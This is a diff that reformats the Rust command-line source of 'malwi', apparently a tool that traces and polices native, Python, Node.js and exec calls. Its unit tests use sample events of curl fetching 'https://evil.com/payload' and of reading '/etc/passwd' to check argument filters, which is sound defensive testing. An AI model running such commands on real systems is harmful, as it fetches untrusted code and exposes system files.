@@ -22,8 +22,8 @@ use std::thread;
 use anyhow::Result;
 use clap::{Parser, Subcommand};
 use log::{debug, warn};
-use malwi_protocol::{HookConfig, HookType, ReviewDecision, RuntimeStack, TraceEvent};
 use malwi_protocol::glob::{matches_glob, matches_glob_ci};
+use malwi_protocol::{HookConfig, HookType, ReviewDecision, RuntimeStack, TraceEvent};
 
 use std::path::Path;
 
@@ -53,23 +53,48 @@ enum Commands {
     )]
     X {
         /// Native symbols to trace
-        #[arg(short = 's', long = "symbol", value_name = "PATTERN", help_heading = "Tracing")]
+        #[arg(
+            short = 's',
+            long = "symbol",
+            value_name = "PATTERN",
+            help_heading = "Tracing"
+        )]
         symbols: Vec<String>,
 
         /// Child process commands to trace
-        #[arg(short = 'c', long = "command", value_name = "PATTERN", help_heading = "Tracing")]
+        #[arg(
+            short = 'c',
+            long = "command",
+            value_name = "PATTERN",
+            help_heading = "Tracing"
+        )]
         exec: Vec<String>,
 
         /// Python functions to trace
-        #[arg(long = "py", visible_alias = "python", value_name = "PATTERN", help_heading = "Tracing")]
+        #[arg(
+            long = "py",
+            visible_alias = "python",
+            value_name = "PATTERN",
+            help_heading = "Tracing"
+        )]
         python: Vec<String>,
 
         /// Node.js functions to trace
-        #[arg(long = "js", visible_alias = "javascript", value_name = "PATTERN", help_heading = "Tracing")]
+        #[arg(
+            long = "js",
+            visible_alias = "javascript",
+            value_name = "PATTERN",
+            help_heading = "Tracing"
+        )]
         javascript: Vec<String>,
 
         /// Policy YAML file [default: ~/.config/malwi/policies/default.yaml]
-        #[arg(short = 'p', long = "policy", value_name = "FILE", help_heading = "Policy")]
+        #[arg(
+            short = 'p',
+            long = "policy",
+            value_name = "FILE",
+            help_heading = "Policy"
+        )]
         policy: Option<PathBuf>,
 
         /// Enable review mode (prompt on each call with Y/n/i options)
@@ -152,17 +177,14 @@ fn main() -> Result<()> {
             };
             spawn_and_trace(trace_config, program)?;
         }
-        Commands::M {
-            port,
-            stack_trace,
-        } => {
+        Commands::M { port, stack_trace } => {
             monitor::run_monitor(port, stack_trace)?;
         }
         Commands::P { name } => match name.as_deref() {
             None => config::list_policies()?,
             Some("reset") => config::reset_policies()?,
             Some(name) => config::write_policy(name)?,
-        }
+        },
     }
 
     Ok(())
@@ -208,7 +230,11 @@ impl FilterPattern {
     /// Uses case-insensitive matching (important for DNS hostnames).
     fn matches(&self, text: &str) -> bool {
         let any_match = self.patterns.iter().any(|p| matches_glob_ci(p, text));
-        if self.inverted { !any_match } else { any_match }
+        if self.inverted {
+            !any_match
+        } else {
+            any_match
+        }
     }
 }
 
@@ -245,7 +271,9 @@ impl ArgFilter {
 
     /// Check if a trace event should be displayed.
     fn should_display_trace(&self, event: &TraceEvent) -> bool {
-        let args_text = event.arguments.iter()
+        let args_text = event
+            .arguments
+            .iter()
             .filter_map(|a| a.display.as_ref())
             .cloned()
             .collect::<Vec<_>>()
@@ -260,7 +288,6 @@ impl ArgFilter {
 
         true
     }
-
 }
 
 /// Build hook configs and associated metadata from a list of specs for a given hook type.
@@ -272,18 +299,21 @@ fn build_hooks(
     arg_count: Option<usize>,
     capture_return: bool,
 ) -> Vec<(HookConfig, String, Option<String>)> {
-    specs.iter().map(|spec| {
-        let (sym, bracket_content) = parse_call_spec(spec);
-        let config = HookConfig {
-            hook_type: hook_type.clone(),
-            symbol: sym.to_string(),
-            arg_count,
-            capture_return,
-            capture_stack,
-        };
-        let key = sym.to_string();
-        (config, key, bracket_content.map(|s| s.to_string()))
-    }).collect()
+    specs
+        .iter()
+        .map(|spec| {
+            let (sym, bracket_content) = parse_call_spec(spec);
+            let config = HookConfig {
+                hook_type: hook_type.clone(),
+                symbol: sym.to_string(),
+                arg_count,
+                capture_return,
+                capture_stack,
+            };
+            let key = sym.to_string();
+            (config, key, bracket_content.map(|s| s.to_string()))
+        })
+        .collect()
 }
 
 // =============================================================================
@@ -301,9 +331,14 @@ impl MonitorClient {
     /// Create a new monitor client and verify the monitor is running.
     fn new(port: u16) -> Result<Self> {
         let addr = format!("127.0.0.1:{}", port);
-        let session_id = format!("{}-{}", std::process::id(),
-            std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH)
-                .unwrap_or_default().as_nanos());
+        let session_id = format!(
+            "{}-{}",
+            std::process::id(),
+            std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .unwrap_or_default()
+                .as_nanos()
+        );
 
         // Check if monitor is running
         match monitor_http_get(&addr, "/health") {
@@ -410,7 +445,6 @@ fn monitor_http_get(addr: &str, path: &str) -> Result<String> {
     Ok(response.split("\r\n\r\n").nth(1).unwrap_or("").to_string())
 }
 
-
 /// Configuration for the `spawn_and_trace` entry point.
 struct TraceConfig {
     symbols: Vec<String>,
@@ -460,18 +494,22 @@ fn maybe_transform_piped_download(program: Vec<String>) -> (Vec<String>, Option<
     // For wget: must have -O-/--output-document=- (explicit stdout)
     if is_curl {
         let has_output_flag = program[1..].iter().any(|arg| {
-            arg == "-o" || arg == "--output" || arg.starts_with("-o") || arg.starts_with("--output=")
+            arg == "-o"
+                || arg == "--output"
+                || arg.starts_with("-o")
+                || arg.starts_with("--output=")
         });
         if has_output_flag {
             return (program, None);
         }
     } else {
         // wget: needs explicit -O - or --output-document=-
-        let has_stdout_flag = program[1..].windows(2).any(|w| {
-            (w[0] == "-O" && w[1] == "-") || w[0] == "-O-"
-        }) || program[1..].iter().any(|arg| {
-            arg == "-O-" || arg == "--output-document=-"
-        });
+        let has_stdout_flag = program[1..]
+            .windows(2)
+            .any(|w| (w[0] == "-O" && w[1] == "-") || w[0] == "-O-")
+            || program[1..]
+                .iter()
+                .any(|arg| arg == "-O-" || arg == "--output-document=-");
         if !has_stdout_flag {
             return (program, None);
         }
@@ -533,37 +571,46 @@ fn spawn_and_trace(config: TraceConfig, program: Vec<String>) -> Result<()> {
 
     debug!("Spawning: {:?}", program);
 
-    let has_manual_hooks = !config.symbols.is_empty() || !config.python.is_empty() || !config.javascript.is_empty() || !config.exec.is_empty();
+    let has_manual_hooks = !config.symbols.is_empty()
+        || !config.python.is_empty()
+        || !config.javascript.is_empty()
+        || !config.exec.is_empty();
 
     // Load policy (if applicable)
-    let active_policy: Option<policy_bridge::ActivePolicy> = if let Some(ref path) = config.policy_file {
-        // Explicit --policy flag: try as named policy first, then as file path.
-        let path_str = path.to_string_lossy();
-        let p = if !path.exists() {
-            if let Some(yaml) = auto_policy::embedded_policy(&path_str) {
-                policy_bridge::ActivePolicy::from_yaml(&yaml)
-                    .map_err(|e| anyhow::anyhow!("Failed to parse named policy '{}': {}", path_str, e))?
+    let active_policy: Option<policy_bridge::ActivePolicy> =
+        if let Some(ref path) = config.policy_file {
+            // Explicit --policy flag: try as named policy first, then as file path.
+            let path_str = path.to_string_lossy();
+            let p = if !path.exists() {
+                if let Some(yaml) = auto_policy::embedded_policy(&path_str) {
+                    policy_bridge::ActivePolicy::from_yaml(&yaml).map_err(|e| {
+                        anyhow::anyhow!("Failed to parse named policy '{}': {}", path_str, e)
+                    })?
+                } else {
+                    policy_bridge::ActivePolicy::from_file(&path_str)?
+                }
             } else {
                 policy_bridge::ActivePolicy::from_file(&path_str)?
-            }
+            };
+            Some(p)
+        } else if has_manual_hooks {
+            // Manual hooks given → no policy
+            None
+        } else if let Some(policy_name) = auto_policy::detect_policy(&program) {
+            // Auto-detected command-specific policy
+            let path = auto_policy::ensure_auto_policy(policy_name)?;
+            eprintln!("Using policy: {} ({})", policy_name, path.display());
+            Some(policy_bridge::ActivePolicy::from_file(
+                &path.to_string_lossy(),
+            )?)
         } else {
-            policy_bridge::ActivePolicy::from_file(&path_str)?
+            // Default policy from config file
+            let config_path = self::config::default_policy_path()?;
+            self::config::ensure_default_policy(&config_path)?;
+            Some(policy_bridge::ActivePolicy::from_file(
+                &config_path.to_string_lossy(),
+            )?)
         };
-        Some(p)
-    } else if has_manual_hooks {
-        // Manual hooks given → no policy
-        None
-    } else if let Some(policy_name) = auto_policy::detect_policy(&program) {
-        // Auto-detected command-specific policy
-        let path = auto_policy::ensure_auto_policy(policy_name)?;
-        eprintln!("Using policy: {} ({})", policy_name, path.display());
-        Some(policy_bridge::ActivePolicy::from_file(&path.to_string_lossy())?)
-    } else {
-        // Default policy from config file
-        let config_path = self::config::default_policy_path()?;
-        self::config::ensure_default_policy(&config_path)?;
-        Some(policy_bridge::ActivePolicy::from_file(&config_path.to_string_lossy())?)
-    };
 
     // Build hook configs from policy + manual specs
     let mut hook_configs: Vec<HookConfig> = Vec::new();
@@ -583,10 +630,34 @@ fn spawn_and_trace(config: TraceConfig, program: Vec<String>) -> Result<()> {
 
     // Build hooks for each type
     let all_hooks = [
-        build_hooks(&config.symbols, HookType::Native, config.stack_trace, Some(6), true),
-        build_hooks(&config.python, HookType::Python, config.stack_trace, None, true),
-        build_hooks(&config.javascript, HookType::Nodejs, config.stack_trace, None, true),
-        build_hooks(&config.exec, HookType::Exec, config.stack_trace, None, false),
+        build_hooks(
+            &config.symbols,
+            HookType::Native,
+            config.stack_trace,
+            Some(6),
+            true,
+        ),
+        build_hooks(
+            &config.python,
+            HookType::Python,
+            config.stack_trace,
+            None,
+            true,
+        ),
+        build_hooks(
+            &config.javascript,
+            HookType::Nodejs,
+            config.stack_trace,
+            None,
+            true,
+        ),
+        build_hooks(
+            &config.exec,
+            HookType::Exec,
+            config.stack_trace,
+            None,
+            false,
+        ),
     ];
 
     for hooks in &all_hooks {
@@ -882,7 +953,10 @@ fn run_main_event_loop(
                 // Check if root process exited without ever connecting
                 // This handles cases like non-existent programs or immediate crashes
                 if !state.seen_root && !is_process_alive(config.root_pid) {
-                    debug!("Root process {} exited before agent connected", config.root_pid);
+                    debug!(
+                        "Root process {} exited before agent connected",
+                        config.root_pid
+                    );
                     anyhow::bail!("Target process exited before agent could connect (program may not exist or crashed immediately)");
                 }
                 // Fallback: if root process has exited but some agents haven't
@@ -948,11 +1022,23 @@ fn process_event(
     state: &mut EventLoopState,
 ) -> Result<()> {
     match event {
-        AgentEvent::Ready { pid, hooks, nodejs_version, python_version, bash_version, modules } => {
+        AgentEvent::Ready {
+            pid,
+            hooks,
+            nodejs_version,
+            python_version,
+            bash_version,
+            modules,
+        } => {
             if let Some(v) = nodejs_version {
                 debug!("Node.js {} detected, addon loaded", v);
             }
-            debug!("Agent ready (PID {}): {} hooks installed, {} modules", pid, hooks.len(), modules.len());
+            debug!(
+                "Agent ready (PID {}): {} hooks installed, {} modules",
+                pid,
+                hooks.len(),
+                modules.len()
+            );
             for hook in &hooks {
                 debug!("  - {}", hook);
             }
@@ -981,7 +1067,9 @@ fn process_event(
                 // agent's hook list.
                 for hc in config.requested_hooks {
                     if hc.hook_type == malwi_protocol::HookType::Native
-                        && !hooks.iter().any(|h| h == &hc.symbol || matches_glob(&hc.symbol, h))
+                        && !hooks
+                            .iter()
+                            .any(|h| h == &hc.symbol || matches_glob(&hc.symbol, h))
                     {
                         eprintln!("Error: Symbol not found: {}", hc.symbol);
                     }
@@ -1008,11 +1096,24 @@ fn process_event(
                 match disp {
                     policy_bridge::EventDisposition::Suppress => return Ok(()),
                     policy_bridge::EventDisposition::Block { rule, section } => {
-                        emit_blocked(&trace_event, &rule, &section, config.monitor_client, state.output_writer.as_deref_mut());
+                        emit_blocked(
+                            &trace_event,
+                            &rule,
+                            &section,
+                            config.monitor_client,
+                            state.output_writer.as_deref_mut(),
+                        );
                         return Ok(());
                     }
-                    policy_bridge::EventDisposition::Warn { rule: _, section: _ } => {
-                        emit_warning(&trace_event, config.monitor_client, state.output_writer.as_deref_mut());
+                    policy_bridge::EventDisposition::Warn {
+                        rule: _,
+                        section: _,
+                    } => {
+                        emit_warning(
+                            &trace_event,
+                            config.monitor_client,
+                            state.output_writer.as_deref_mut(),
+                        );
                         // For exec events, the warning line already contains the full command.
                         // For function calls, fall through to also print the call details.
                         if trace_event.hook_type == HookType::Exec {
@@ -1033,7 +1134,9 @@ fn process_event(
 
             // Resolve native stack symbols before display
             let resolved_frames = if !trace_event.native_stack.is_empty() {
-                state.symbol_resolver.resolve_addresses(&trace_event.native_stack)
+                state
+                    .symbol_resolver
+                    .resolve_addresses(&trace_event.native_stack)
             } else {
                 vec![]
             };
@@ -1042,7 +1145,12 @@ fn process_event(
             if let Some(client) = config.monitor_client {
                 let _ = client.send_event(&trace_event);
             } else if let Some(ref mut out) = state.output_writer {
-                print_trace_event(&trace_event, &resolved_frames, out, config.stack_trace_enabled)?;
+                print_trace_event(
+                    &trace_event,
+                    &resolved_frames,
+                    out,
+                    config.stack_trace_enabled,
+                )?;
             }
         }
         AgentEvent::Disconnected { pid } => {
@@ -1055,12 +1163,22 @@ fn process_event(
                 if let Some(pol) = config.active_policy {
                     match pol.evaluate_trace(&event) {
                         policy_bridge::EventDisposition::Block { rule, section } => {
-                            emit_blocked(&event, &rule, &section, config.monitor_client, state.output_writer.as_deref_mut());
+                            emit_blocked(
+                                &event,
+                                &rule,
+                                &section,
+                                config.monitor_client,
+                                state.output_writer.as_deref_mut(),
+                            );
                             ReviewDecision::Block
                         }
                         policy_bridge::EventDisposition::Suppress => ReviewDecision::Suppress,
                         policy_bridge::EventDisposition::Warn { .. } => {
-                            emit_warning(&event, config.monitor_client, state.output_writer.as_deref_mut());
+                            emit_warning(
+                                &event,
+                                config.monitor_client,
+                                state.output_writer.as_deref_mut(),
+                            );
                             ReviewDecision::Warn
                         }
                         policy_bridge::EventDisposition::Display => ReviewDecision::Allow,
@@ -1182,7 +1300,8 @@ fn format_event_display_name(event: &TraceEvent) -> String {
     if event.hook_type == HookType::Exec {
         let name = display_name(&event.function);
         let start = 1.min(event.arguments.len());
-        let args: Vec<String> = event.arguments[start..].iter()
+        let args: Vec<String> = event.arguments[start..]
+            .iter()
             .filter_map(|a| a.display.clone())
             .collect();
         let args_str = shell_format::format_shell_command(&args, 200);
@@ -1193,8 +1312,14 @@ fn format_event_display_name(event: &TraceEvent) -> String {
         }
     } else if !event.arguments.is_empty() {
         let name = display_name(&event.function);
-        let args: Vec<String> = event.arguments.iter()
-            .map(|a| a.display.clone().unwrap_or_else(|| format!("{:#x}", a.raw_value)))
+        let args: Vec<String> = event
+            .arguments
+            .iter()
+            .map(|a| {
+                a.display
+                    .clone()
+                    .unwrap_or_else(|| format!("{:#x}", a.raw_value))
+            })
             .collect();
         format!("{}({})", name, args.join(", "))
     } else {
@@ -1207,10 +1332,15 @@ fn print_review_summary(event: &TraceEvent) {
     let name = display_name(&event.function);
 
     // Format arguments (truncated for summary)
-    let args: Vec<String> = event.arguments.iter()
+    let args: Vec<String> = event
+        .arguments
+        .iter()
         .take(3) // Limit to first 3 args for summary
         .map(|a| {
-            let val = a.display.clone().unwrap_or_else(|| format!("{:#x}", a.raw_value));
+            let val = a
+                .display
+                .clone()
+                .unwrap_or_else(|| format!("{:#x}", a.raw_value));
             if val.len() > 40 {
                 format!("{}...", &val[..37])
             } else {
@@ -1229,7 +1359,10 @@ fn print_review_summary(event: &TraceEvent) {
     if args_str.is_empty() {
         println!("{}[malwi]{} {}{}", YELLOW, RESET, name, src);
     } else {
-        println!("{}[malwi]{} {}{}({}){}{}", YELLOW, RESET, name, DIM, args_str, RESET, src);
+        println!(
+            "{}[malwi]{} {}{}({}){}{}",
+            YELLOW, RESET, name, DIM, args_str, RESET, src
+        );
     }
 }
 
@@ -1245,7 +1378,10 @@ fn print_review_details(event: &TraceEvent) {
         }
         Some(RuntimeStack::Nodejs(frames)) if !frames.is_empty() => {
             let f = &frames[0];
-            println!("  {}File:{} {}:{}:{}", DIM, RESET, f.script, f.line, f.column);
+            println!(
+                "  {}File:{} {}:{}:{}",
+                DIM, RESET, f.script, f.line, f.column
+            );
         }
         _ => {
             if !event.native_stack.is_empty() {
@@ -1257,7 +1393,10 @@ fn print_review_details(event: &TraceEvent) {
     // Print full arguments
     println!("  {}Args:{}", DIM, RESET);
     for (i, arg) in event.arguments.iter().enumerate() {
-        let val = arg.display.clone().unwrap_or_else(|| format!("{:#x}", arg.raw_value));
+        let val = arg
+            .display
+            .clone()
+            .unwrap_or_else(|| format!("{:#x}", arg.raw_value));
         println!("    [{}] = {}", i, val);
     }
 
@@ -1269,12 +1408,18 @@ fn print_review_details(event: &TraceEvent) {
         match &event.runtime_stack {
             Some(RuntimeStack::Python(frames)) => {
                 for frame in frames {
-                    println!("    {}:{} in {}()", frame.filename, frame.line, frame.function);
+                    println!(
+                        "    {}:{} in {}()",
+                        frame.filename, frame.line, frame.function
+                    );
                 }
             }
             Some(RuntimeStack::Nodejs(frames)) => {
                 for frame in frames {
-                    println!("    {}:{}:{} in {}()", frame.script, frame.line, frame.column, frame.function);
+                    println!(
+                        "    {}:{}:{} in {}()",
+                        frame.script, frame.line, frame.column, frame.function
+                    );
                 }
             }
             None => {}
@@ -1301,15 +1446,11 @@ fn format_native_frame(frame: &malwi_protocol::NativeFrame) -> String {
         (Some(sym), None, Some(off)) if off > 0 => {
             format!("{}+{:#x}", sym, off)
         }
-        (Some(sym), None, _) => {
-            sym.clone()
-        }
+        (Some(sym), None, _) => sym.clone(),
         (None, Some(module), Some(off)) => {
             format!("{}+{:#x}", module, off)
         }
-        (None, Some(module), None) => {
-            module.clone()
-        }
+        (None, Some(module), None) => module.clone(),
         _ => {
             format!("{:#x}", frame.address)
         }
@@ -1331,7 +1472,12 @@ pub fn format_source_location(source_file: &Option<String>, source_line: Option<
     }
 }
 
-fn print_trace_event(event: &TraceEvent, resolved_stack: &[malwi_protocol::NativeFrame], output: &mut Box<dyn Write>, stack_trace_enabled: bool) -> Result<()> {
+fn print_trace_event(
+    event: &TraceEvent,
+    resolved_stack: &[malwi_protocol::NativeFrame],
+    output: &mut Box<dyn Write>,
+    stack_trace_enabled: bool,
+) -> Result<()> {
     use malwi_protocol::EventType;
 
     // Only print ENTER events - skip LEAVE entirely
@@ -1340,32 +1486,51 @@ fn print_trace_event(event: &TraceEvent, resolved_stack: &[malwi_protocol::Nativ
     }
 
     let name = display_name(&event.function);
-    let color = if event.hook_type == HookType::DirectSyscall { RED } else { LIGHT_BLUE };
+    let color = if event.hook_type == HookType::DirectSyscall {
+        RED
+    } else {
+        LIGHT_BLUE
+    };
     let src = format_source_location(&event.source_file, event.source_line);
 
     if event.hook_type == HookType::Exec {
         // Exec: "cmd arg1 arg2" style (skip argv[0] which is the function name)
         let start = 1.min(event.arguments.len());
-        let args: Vec<String> = event.arguments[start..].iter()
+        let args: Vec<String> = event.arguments[start..]
+            .iter()
             .filter_map(|a| a.display.clone())
             .collect();
         let args_str = shell_format::format_shell_command(&args, 200);
         if args_str.is_empty() {
             writeln!(output, "{}[malwi]{} {}{}", color, RESET, name, src)?;
         } else {
-            writeln!(output, "{}[malwi]{} {} {}{}{}{}",  color, RESET, name, DIM, args_str, RESET, src)?;
+            writeln!(
+                output,
+                "{}[malwi]{} {} {}{}{}{}",
+                color, RESET, name, DIM, args_str, RESET, src
+            )?;
         }
     } else {
         // Function call: "func(arg1, arg2)" style
-        let args: Vec<String> = event.arguments.iter()
-            .map(|a| a.display.clone().unwrap_or_else(|| format!("{:#x}", a.raw_value)))
+        let args: Vec<String> = event
+            .arguments
+            .iter()
+            .map(|a| {
+                a.display
+                    .clone()
+                    .unwrap_or_else(|| format!("{:#x}", a.raw_value))
+            })
             .collect();
         let args_str = args.join(", ");
 
         if args_str.is_empty() {
             writeln!(output, "{}[malwi]{} {}{}", color, RESET, name, src)?;
         } else {
-            writeln!(output, "{}[malwi]{} {}{}({}){}{}",  color, RESET, name, DIM, args_str, RESET, src)?;
+            writeln!(
+                output,
+                "{}[malwi]{} {}{}({}){}{}",
+                color, RESET, name, DIM, args_str, RESET, src
+            )?;
         }
     }
 
@@ -1373,19 +1538,33 @@ fn print_trace_event(event: &TraceEvent, resolved_stack: &[malwi_protocol::Nativ
     if stack_trace_enabled {
         // Native stack frames
         for frame in resolved_stack {
-            writeln!(output, "{}    at {}{}", DIM, format_native_frame(frame), RESET)?;
+            writeln!(
+                output,
+                "{}    at {}{}",
+                DIM,
+                format_native_frame(frame),
+                RESET
+            )?;
         }
 
         // Runtime stack frames (Python, V8, etc.)
         match &event.runtime_stack {
             Some(RuntimeStack::Python(frames)) => {
                 for frame in frames {
-                    writeln!(output, "{}    at {} ({}:{}){}", DIM, frame.function, frame.filename, frame.line, RESET)?;
+                    writeln!(
+                        output,
+                        "{}    at {} ({}:{}){}",
+                        DIM, frame.function, frame.filename, frame.line, RESET
+                    )?;
                 }
             }
             Some(RuntimeStack::Nodejs(frames)) => {
                 for frame in frames {
-                    writeln!(output, "{}    at {} ({}:{}:{}){}", DIM, frame.function, frame.script, frame.line, frame.column, RESET)?;
+                    writeln!(
+                        output,
+                        "{}    at {} ({}:{}:{}){}",
+                        DIM, frame.function, frame.script, frame.line, frame.column, RESET
+                    )?;
                 }
             }
             None => {}
@@ -1410,10 +1589,13 @@ mod tests {
             hook_type: HookType::default(),
             event_type: EventType::Enter,
             function: function.to_string(),
-            arguments: args.iter().map(|s| Argument {
-                raw_value: 0,
-                display: Some(s.to_string()),
-            }).collect(),
+            arguments: args
+                .iter()
+                .map(|s| Argument {
+                    raw_value: 0,
+                    display: Some(s.to_string()),
+                })
+                .collect(),
             native_stack: vec![],
             runtime_stack: None,
             network_info: None,
@@ -1431,10 +1613,13 @@ mod tests {
             hook_type: HookType::Exec,
             event_type: EventType::Enter,
             function: cmd.to_string(),
-            arguments: all_args.iter().map(|s| Argument {
-                raw_value: 0,
-                display: Some(s.to_string()),
-            }).collect(),
+            arguments: all_args
+                .iter()
+                .map(|s| Argument {
+                    raw_value: 0,
+                    display: Some(s.to_string()),
+                })
+                .collect(),
             native_stack: vec![],
             runtime_stack: None,
             network_info: None,
@@ -1447,7 +1632,10 @@ mod tests {
 
     #[test]
     fn test_format_source_location_with_absolute_path() {
-        let result = format_source_location(&Some("/usr/lib/python3.12/json/__init__.py".to_string()), Some(42));
+        let result = format_source_location(
+            &Some("/usr/lib/python3.12/json/__init__.py".to_string()),
+            Some(42),
+        );
         assert!(result.contains("__init__.py:42"));
     }
 
@@ -1479,7 +1667,10 @@ mod tests {
 
     #[test]
     fn test_parse_call_spec_with_brackets() {
-        assert_eq!(parse_call_spec("connect[*:443]"), ("connect", Some("*:443")));
+        assert_eq!(
+            parse_call_spec("connect[*:443]"),
+            ("connect", Some("*:443"))
+        );
     }
 
     #[test]
@@ -1496,7 +1687,10 @@ mod tests {
     #[test]
     fn test_parse_call_spec_nested_brackets() {
         // rfind('[') picks the last one, so nested brackets work
-        assert_eq!(parse_call_spec("echo[*[test]*]"), ("echo[*", Some("test]*")));
+        assert_eq!(
+            parse_call_spec("echo[*[test]*]"),
+            ("echo[*", Some("test]*"))
+        );
     }
 
     // --- FilterPattern ---
@@ -1567,7 +1761,9 @@ mod tests {
     #[test]
     fn test_arg_filter_per_function_matches() {
         let mut filter = ArgFilter::new();
-        filter.per_function.insert("connect".to_string(), FilterPattern::new("*:443"));
+        filter
+            .per_function
+            .insert("connect".to_string(), FilterPattern::new("*:443"));
 
         let event = make_trace_event("connect", &["example.com:443"]);
         assert!(filter.should_display_trace(&event));
@@ -1583,7 +1779,9 @@ mod tests {
     #[test]
     fn test_arg_filter_exec_event() {
         let mut filter = ArgFilter::new();
-        filter.per_function.insert("curl".to_string(), FilterPattern::new("*evil.com*"));
+        filter
+            .per_function
+            .insert("curl".to_string(), FilterPattern::new("*evil.com*"));
 
         let event = make_exec_event("curl", &["https://evil.com/payload"]);
         assert!(filter.should_display_trace(&event));
@@ -1599,7 +1797,9 @@ mod tests {
     #[test]
     fn test_arg_filter_glob_function_key() {
         let mut filter = ArgFilter::new();
-        filter.per_function.insert("fs.*".to_string(), FilterPattern::new("/etc/*"));
+        filter
+            .per_function
+            .insert("fs.*".to_string(), FilterPattern::new("/etc/*"));
 
         let event = make_trace_event("fs.readFileSync", &["/etc/passwd"]);
         assert!(filter.should_display_trace(&event));
@@ -1611,7 +1811,9 @@ mod tests {
     #[test]
     fn test_arg_filter_inverted_excludes_match() {
         let mut filter = ArgFilter::new();
-        filter.per_function.insert("connect".to_string(), FilterPattern::new("!*:443"));
+        filter
+            .per_function
+            .insert("connect".to_string(), FilterPattern::new("!*:443"));
 
         // Port 443 should be excluded
         let event = make_trace_event("connect", &["example.com:443"]);
@@ -1630,7 +1832,9 @@ mod tests {
         let mut unfiltered: HashSet<String> = HashSet::new();
 
         // First: filtered
-        filter.per_function.insert("connect".to_string(), FilterPattern::new("*:443"));
+        filter
+            .per_function
+            .insert("connect".to_string(), FilterPattern::new("*:443"));
 
         // Then: unfiltered
         unfiltered.insert("connect".to_string());
